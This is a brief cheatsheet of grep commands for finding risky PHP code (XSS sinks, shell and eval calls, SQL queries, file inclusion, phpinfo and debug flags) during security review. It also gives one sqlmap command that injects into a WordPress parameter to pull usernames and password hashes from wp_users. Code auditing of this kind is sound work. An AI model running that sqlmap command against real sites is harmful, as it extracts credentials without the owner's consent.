# PHP vulnerability recon

A cheatsheet for finding vulnerable PHP code using grep. List is categorized by vuln type you generally find during recon with that command. Original source of these is long forgotten.

XSS:
----
```grep -Ri "echo" .```

```grep -Ri "\$_" . | grep "echo"```

```grep -Ri "\$_GET" . | grep "echo"```

```grep -Ri "\$_POST" . | grep "echo"```

```grep -Ri "\$_REQUEST" . | grep "echo"```

Command execution:
------------------
```grep -Ri "shell_exec(" .```

```grep -Ri "system(" .```

```grep -Ri "exec(" .```

```grep -Ri "popen(" .```

```grep -Ri "passthru(" .```

```grep -Ri "proc_open(" .```

```grep -Ri "pcntl_exec(" .```

Code execution:
---------------
```grep -Ri "eval(" .```

```grep -Ri "assert(" .```

```grep -Ri "preg_replace" . | grep "/e"```

```grep -Ri "create_function(" .```

SQL Injection:
--------------
```grep -Ri "\$sql" .```

```grep -Ri "\$sql" . | grep "\$_"```

SQLMAP Cheatsheet for WordPress:
--------------------------------
```
sqlmap -u "http://target.tld/?paramater=1" -p "parameter" --technique=B --dbms=mysql --suffix=")--" --string="Test" --sql-query="select user_login,user_pass from wp_users"
```

Information leak via phpinfo:
-----------------------------
```grep -Ri "phpinfo" .```

Find dev and debug modes:
-------------------------
```grep -Ri "debug" .```

```grep -Ri "\$_GET['debug']" .```

```grep -Ri "\$_GET['test']" .```

RFI/LFI:
--------
```grep -Ri "file_include" .```

```grep -Ri "include(" .```

```grep -Ri "require(" .```

```grep -Ri "require(\$file)" .```

```grep -Ri "include_once(" .```

```grep -Ri "require_once(" .```

```grep -Ri "require_once(" . | grep "\$_"```

Misc:
-----
```grep -Ri "header(" . | grep "\$_"```

```grep -Ri '$_SERVER["HTTP_USER_AGENT"]' .```

Path Traversal:
---------------
```grep -Ri file_get_contents .```
